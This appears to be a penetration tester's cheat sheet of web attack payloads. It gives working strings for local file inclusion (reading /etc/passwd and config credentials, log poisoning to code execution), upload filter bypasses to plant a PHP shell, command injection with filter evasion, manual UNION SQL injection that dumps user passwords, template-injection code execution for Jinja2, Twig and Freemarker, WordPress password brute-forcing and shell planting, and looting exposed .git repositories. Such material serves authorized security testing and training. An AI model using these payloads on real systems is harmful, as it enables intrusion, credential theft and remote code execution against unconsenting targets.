title: LFI / path traversal payloads
inline_answer:
```
?file=../../../../etc/passwd
?file=....//....//etc/passwd                 # filter bypass
?file=php://filter/convert.base64-encode/resource=index.php   # read source
?file=php://filter/.../resource=config.php   # then base64 -d for creds
?file=/var/log/apache2/access.log            # log poisoning -> RCE
?file=data://text/plain;base64,PD9waHA...    # data wrapper RCE
```

Windows: `..\..\windows\win.ini`. Try null byte `%00` on old PHP.

title: File upload filter bypass
inline_answer: Try in order: alt PHP exts `.phtml .php3 .php5 .php7 .pht`; case `.PhP`; double `.php.jpg` / `.jpg.php`; trailing `.php.` / `.php%00.jpg`; `Content-Type: image/png`; magic bytes `GIF89a;` prepended; `.htaccess` making `.jpg`=PHP. Find where it lands (often `/uploads/`), then browse to the shell.

title: Command injection
inline_answer: Separators: `; cmd` | `| cmd` | `&& cmd` | `%0a cmd` | `$(cmd)` | `` `cmd` ``. Blind = no output: confirm with `; ping -c3 KALI` (tcpdump) or out-of-band. WAF/space filter: `cat${IFS}/etc/passwd`, `{cat,/etc/passwd}`, `X=$'\x20';cat$X/etc/passwd`. Then a reverse shell payload.

title: UNION-based SQLi (manual — no sqlmap)
inline_answer:
sqlmap is **banned** on the engagement — do this in Burp Repeater.

```
' ORDER BY 1-- -            # increment until error => column count
' UNION SELECT NULL,NULL-- - # match count; find a string-typed col
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,concat(user,0x3a,password),3 FROM users-- -
```

title: SSTI — detect & exploit
inline_answer:
Detect: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` → if `49` rendered, identify engine. Jinja2 RCE:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Twig: `{{['id']|filter('system')}}`. Freemarker: `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`. Use tplmap-style logic manually.

title: WordPress attack path
inline_answer:
```
wpscan --url http://T --enumerate u,vp,ap,t --plugins-detection aggressive --api-token <opt>
wpscan --url http://T -U users.txt -P rockyou.txt   # xmlrpc login brute
```

Admin creds → Appearance → Theme Editor → edit `404.php` to a PHP shell. Or a known vulnerable plugin RCE. Check `/wp-config.php` via LFI for DB creds.

title: Exposed .git → source + secrets
inline_answer:
```
git-dumper http://TARGET/.git/ ./loot_git    # pipx install git-dumper
cd loot_git && git log --all --oneline && git show <commit>
git stash list ; grep -ri 'password\|secret\|api' .
```

Reconstructs the repo — read source for creds, hidden endpoints, deleted files in history.
